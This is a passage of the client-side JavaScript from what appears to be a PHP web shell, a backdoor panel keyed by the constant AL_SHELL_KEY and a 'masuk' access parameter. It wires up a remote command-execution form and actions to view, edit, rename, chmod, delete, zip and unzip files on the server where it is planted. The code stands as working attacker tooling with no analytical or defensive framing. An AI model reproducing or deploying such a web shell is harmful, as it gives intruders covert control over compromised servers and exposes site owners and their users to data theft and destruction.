    const modal = document.getElementById('viewModal');
    const title = document.getElementById('viewTitle');
    const content = document.getElementById('viewContent');
    
    title.textContent = 'View: ' + fileName;
    content.textContent = 'Loading...';
    openModal('viewModal');

    fetch('?masuk=<?= AL_SHELL_KEY ?>&d=<?= urlencode($dir) ?>&action=view_file&file=' + encodeURIComponent(fileName))
        .then(response => response.json())
        .then(data => { content.textContent = data.content; })
        .catch(error => { content.textContent = 'Error loading file: ' + error; });
}

function openEditModal(fileName) {
    const modal = document.getElementById('editModal');
    document.getElementById('editTitle').textContent = 'Edit: ' + fileName;
    document.getElementById('editFile').value = fileName;
    document.getElementById('editContent').value = 'Loading...';
    openModal('editModal');

    fetch('?masuk=<?= AL_SHELL_KEY ?>&d=<?= urlencode($dir) ?>&action=view_file&file=' + encodeURIComponent(fileName))
        .then(response => response.json())
        .then(data => { document.getElementById('editContent').value = data.content; });
}

function openRenameModal(fileName) { 
    document.getElementById('renameTitle').textContent = 'Rename: ' + fileName; 
    document.getElementById('renameTarget').value = fileName;
    document.querySelector('#renameModal input[name="new_name"]').value = fileName;
    openModal('renameModal'); 
}

function openChmodModal(fileName) {
    document.getElementById('chmodTitle').textContent = 'Change Permissions: ' + fileName;
    document.getElementById('chmodTarget').value = fileName;
    document.getElementById('customPermInput').value = '';
    document.getElementById('customPermDiv').style.display = 'none';
    document.getElementById('chmodPermSelect').value = '755'; 
    openModal('chmodModal');
}

function openDeleteModal(fileName) { 
    document.getElementById('deleteMessage').textContent = `Are you sure you want to delete "${fileName}"?`; 
    document.getElementById('deleteTarget').value = fileName; 
    openModal('confirmDeleteModal'); 
}

function goToDefaultDirectory() {
    window.location.href = '?masuk=<?= AL_SHELL_KEY ?>&d=<?= urlencode($default_dir) ?>';
}

document.getElementById('searchForm').addEventListener('submit', function(e) {
    e.preventDefault();
    const modal = document.getElementById('searchResultsModal');
    const contentDiv = document.getElementById('searchResultsContent');
    
    openModal('searchResultsModal');
    contentDiv.innerHTML = 'Searching, please wait...';

    const formData = new FormData(this);
    formData.append('action', 'perform_search');
    formData.append('masuk', '<?= AL_SHELL_KEY ?>');
    formData.append('d', '<?= htmlspecialchars($dir) ?>');

    fetch('?masuk=<?= AL_SHELL_KEY ?>&action=perform_search', { 
        method: 'POST', 
        body: formData 
    })
        .then(response => response.text())
        .then(html => {
            contentDiv.innerHTML = html;
        })
        .catch(error => {
            contentDiv.innerHTML = 'Search failed: ' + error.message;
        });
});

document.getElementById('shellForm').addEventListener('submit', function(e) {
    e.preventDefault();
    const output = document.getElementById('shellOutput');
    output.textContent = 'Executing...';
    const formData = new FormData(this);
    formData.append('masuk', '<?= AL_SHELL_KEY ?>');
    formData.append('d', '<?= htmlspecialchars($dir) ?>');

    fetch('', { method: 'POST', body: formData })
        .then(response => response.text())
        .then(html => {
            const parser = new DOMParser();
            const doc = parser.parseFromString(html, 'text/html');
            const newOutput = doc.querySelector('.output');
            output.textContent = newOutput ? newOutput.innerText.trim() : 'No output returned.';
        })
        .catch(error => {
            output.textContent = 'Error executing command: ' + error;
        });
});

document.getElementById('chmodForm').addEventListener('submit', function(e) {
    e.preventDefault();
    const formData = new FormData(this);
    const permSelect = document.getElementById('chmodPermSelect');
    const customInput = document.getElementById('customPermInput');

    if (permSelect.value === 'custom') {
        if (customInput.value.trim() === '') {
            alert('Please enter a custom permission value.');
            return;
        }
        formData.set('chmod_perm', customInput.value);
    }

    fetch('', { method: 'POST', body: formData }).then(() => window.location.reload());
});

document.getElementById('chmodPermSelect').addEventListener('change', function() {
    const customDiv = document.getElementById('customPermDiv');
    if (this.value === 'custom') {
        customDiv.style.display = 'block';
    } else {
        customDiv.style.display = 'none';
    }
});

document.getElementById('navigateForm').addEventListener('submit', function(e) {
    e.preventDefault();
    const formData = new FormData(this);
    formData.append('masuk', '<?= AL_SHELL_KEY ?>');
    
    fetch('', { method: 'POST', body: formData })
        .then(response => {
            if (response.redirected) {
                window.location.href = response.url;
            } else {
                return response.text();
            }
        })
        .then(html => {
            if (html) {
                const parser = new DOMParser();
                const doc = parser.parseFromString(html, 'text/html');
                const newOutput = doc.querySelector('.output');
                if (newOutput && newOutput.innerText.trim()) {
                    alert(newOutput.innerText.trim());
                }
            }
        })
        .catch(error => {
            alert('Error navigating to directory: ' + error);
        });
});

document.addEventListener('click', function(e) {
    if (e.target.classList.contains('action-link')) {
        const row = e.target.closest('tr');
        if (row) {
            const fileName = row.dataset.filename;
            if (e.target.textContent.includes('[V]')) viewFileAsync(fileName);
            if (e.target.textContent.includes('[E]')) openEditModal(fileName);
            if (e.target.textContent.includes('[R]')) openRenameModal(fileName);
            if (e.target.textContent.includes('[Chmod]')) openChmodModal(fileName);
            if (e.target.textContent.includes('[Del]')) openDeleteModal(fileName);
            if (e.target.textContent.includes('[U]')) unzipFile(fileName);
        }
    }
});

const zipBtn = document.getElementById('zipSelectedBtn');
const deleteBtn = document.getElementById('deleteSelectedBtn');
const selectAllCheckbox = document.getElementById('selectAll');

document.addEventListener('change', function(e) {
    if (e.target.classList.contains('file-select')) {
        const anyChecked = document.querySelectorAll('.file-select:checked').length > 0;
        zipBtn.disabled = !anyChecked;
        deleteBtn.disabled = !anyChecked;
    }
});

selectAllCheckbox.addEventListener('change', function() {
    const checkboxes = document.querySelectorAll('.file-select');
    checkboxes.forEach(cb => cb.checked = this.checked);
    const event = new Event('change');
    document.querySelector('.file-select').dispatchEvent(event);
});

zipBtn.addEventListener('click', function() {
    const checkboxes = document.querySelectorAll('.file-select:checked');
    if (checkboxes.length === 0) return;

    const formData = new FormData();
    formData.append('action', 'zip_selected');
    checkboxes.forEach(cb => formData.append('selected_files[]', cb.value));

    fetch('', { method: 'POST', body: formData }).then(() => window.location.reload());
});

deleteBtn.addEventListener('click', function() {
    const checkboxes = document.querySelectorAll('.file-select:checked');
    if (checkboxes.length === 0) return;
    
    if (confirm(`Are you sure you want to delete ${checkboxes.length} selected item(s)?`)) {
        const formData = new FormData();
        formData.append('action', 'delete_selected');
        checkboxes.forEach(cb => formData.append('selected_files[]', cb.value));

        fetch('', { method: 'POST', body: formData }).then(() => window.location.reload());
    }
});

function unzipFile(fileName) {
    if (confirm(`Unzip "${fileName}"?`)) {
        const formData = new FormData();
        formData.append('action', 'unzip_file');
        formData.append('unzip_target', fileName);
        fetch('', { method: 'POST', body: formData }).then(() => window.location.reload());
    }
}

function sortTable(columnIndex) {
    const table = document.querySelector(".file-table");
    const tbody = table.querySelector("tbody");
    const rows = Array.from(tbody.querySelectorAll("tr"));
    const isAscending = table.dataset.sortOrder === 'asc';
    table.dataset.sortOrder = isAscending ? 'desc' : 'asc';

    rows.sort((a, b) => {
        if (!a.hasAttribute('data-filename')) return -1;
        if (!b.hasAttribute('data-filename')) return 1;

        let aVal = a.children[columnIndex + 1].textContent.trim();
        let bVal = b.children[columnIndex + 1].textContent.trim();

        if (columnIndex === 3) { 
            if (aVal === '—') aVal = -1;
            else aVal = parseFloat(aVal.replace(' MB', ''));
            
            if (bVal === '—') bVal = -1;
            else bVal = parseFloat(bVal.replace(' MB', ''));
        } else if (columnIndex === 4) { 
            const parseDate = (str) => {
                const parts = str.split(' ');
                const dParts = parts[0].split('-');
                return new Date(`${dParts[2]}-${dParts[1]}-${dParts[0]} ${parts[1]}`).getTime();
            };
            aVal = parseDate(aVal);
            bVal = parseDate(bVal);
        }

        if (aVal < bVal) return isAscending ? -1 : 1;
        if (aVal > bVal) return isAscending ? 1 : -1;
        return 0;
    });

    tbody.innerHTML = "";
    rows.forEach(row => tbody.appendChild(row));
}
</script>

</body>
</html>